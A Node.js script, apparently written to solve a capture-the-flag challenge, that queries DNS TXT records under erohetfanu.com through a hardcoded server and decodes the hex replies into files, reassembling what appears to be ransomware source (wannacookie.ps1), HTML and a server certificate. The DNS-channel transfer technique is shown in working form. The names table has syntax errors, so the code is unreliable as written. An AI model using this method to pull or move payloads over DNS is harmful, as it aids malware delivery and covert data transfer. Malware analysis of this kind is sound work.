const { Resolver } = require('dns');
const resolver = new Resolver();
const fs = require('fs');
resolver.setServers(['104.196.126.19']); // erohetfanu.com'

const names = {
  'wannacookie.ps1' : { count: 84, name:  '77616E6E61636F6F6B69652E707331'},
  'source.min.html' : { count: 3378, name: '736f757263652e6d696e2e68746d6c'},
  'source.html' : { count: 6786, name: '736f757263652e68746d6c'}
  'server.crt': { count: , name: '7365727665722e637274'}
}


const file = names['source.html'];

const positions = [];

let pages = [...Array(file.count).keys()];

console.log(pages);

// grep insert * | grep txt | cut -d. -f1 | xargs | sed "s/ /','/g"
pages = [

];

console.error("START");
pages.forEach((page) => {
    positions.push(new Promise((ok, ko) => {
        resolver.resolveTxt(  page +'.'+ file.name +'.erohetfanu.com', (err, res)  => {
          console.error("Page", page);
          if(err) {
            console.error("FAILED ON ", page)
            return ok("0a0a2d2d2d2d2d20696e736572742068657265202d2d2d2d2d0a0a")
          }
          return ok(res[0][0]);
        })

    }).then((hexa) => {

      const fname = ("0000" + page).slice(-4) + '.txt';

      try {
          if(fs.readFileSync(fname).includes('insert here')) {
              fs.unlinkSync(fname)
          }
      } catch {};

      const ascii = hexa.match(/.{1,2}/g).map((asciiCodeInHexa) => {
          return String.fromCharCode(parseInt(asciiCodeInHexa, 16))
      }).join('').toString()

      fs.writeFileSync(fname, ascii);

      return ascii;
    }));
})


const source = Promise.all(positions).then((res) => {
    /*
    res.forEach((a, index) => {
        res[index] = a.match(/.{1,2}/g).map((asciiCodeInHexa) => {
            return String.fromCharCode(parseInt(asciiCodeInHexa, 16))
        }).join('').toString()
    })

    return res;
    */

    return res.join('').replace(/\r/g, "\n");
}).then((source) => {
    console.log(source);
})
